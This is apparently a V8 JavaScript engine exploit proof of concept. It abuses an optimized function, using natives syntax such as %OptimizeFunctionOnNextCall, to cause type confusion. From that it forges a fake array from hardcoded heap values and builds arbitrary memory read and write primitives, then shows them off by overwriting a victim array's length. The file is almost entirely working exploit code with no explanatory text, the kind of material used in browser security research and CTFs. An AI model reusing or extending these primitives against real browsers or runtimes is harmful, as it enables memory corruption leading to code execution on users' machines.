var addrOf_LO = new Array(0x30000);

function assert(val) {
    if (!val)
        throw "Assertion Failed";
}

class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);
        this.index = 0;
    }

    pair_i32_to_f64(p1, p2) {
        this.u32[0] = p1;
        this.u32[1] = p2;
        return this.f64[0];
    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }

    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }

    set_i64(i) {
        this.u64[0] = i;
    }

    set_l(i) {
        this.u32[0] = i;
    }

    set_h(i) {
        this.u32[1] = i;
    }

    get_i64() {
        return this.u64[0];
    }

    ftoil(f) {
        this.f64[0] = f;
        return this.u32[0]
    }

    ftoih(f) {
        this.f64[0] = f;
        return this.u32[1]
    }

    mark_sweep_gc() {
        new ArrayBuffer(0x7fe00000);
    }

    scavenge_gc() {
        for (var i = 0; i < 8; i++) {
            this.add_ref(new ArrayBuffer(0x200000));
        }
        this.add_ref(new ArrayBuffer(8));
    }
    trap() {
        while (1) {
        }
    }
}

var helper = new Helpers();
var fake_arr_buf = null;
var fake_arr = null;

function exp() {
    function f0(v2, v3) {
        var v4 = v3[0]; 
        var v5 = v2[0]; 
        // fake_arr_buf elements: 0x2d8e00049db5
        // 0x00002a6000049dbd
        Array.prototype.push.call(v3, 4.950618252845e-311);
   }
   %PrepareFunctionForOptimization(f0);
   var v0 = new Array(1); 
   v0[0] = 'tagged';
   f0(v0, [1]);

   var v1 = new Array(1); 
   v1[0] = 0.1;
   %OptimizeFunctionOnNextCall(f0);

    // 0x00189c39  0x00000745  0x000495bd  0x00000466
    // map        properties  elements    length
    fake_arr_buf = [
        3.9490349638436e-311, 2.3893674090823e-311,
        1.1, 1.1, 1.1, 1.1, 1.1, 1.1, 1.1
    ];
    helper.mark_sweep_gc();

   f0(v1, v1);
   v1[5] = 0.1;
   
   fake_arr = v1[2];
}
exp();
exp();

function arbRead(where) {
    fake_arr_buf[1] = helper.pair_i32_to_f64(where - 8, 0x60000);
    return helper.f64toi64(fake_arr[0]);
}

function arbWrite(where, what) {
    fake_arr_buf[1] = helper.pair_i32_to_f64(where - 8, 0x60000);
    fake_arr[0] = helper.i64tof64(what);
}

console.log("fake_arr: " + fake_arr.length);

var victim_array = [1.1, 1.2];
console.log("Now we try to modify the length of the victim array...");
console.log("Before: " + victim_array.length);
arbWrite(0x4017d + 1 + 0xc, 0x2333n);
console.log("After: " + victim_array.length);

// flags: --allow-natives-syntax
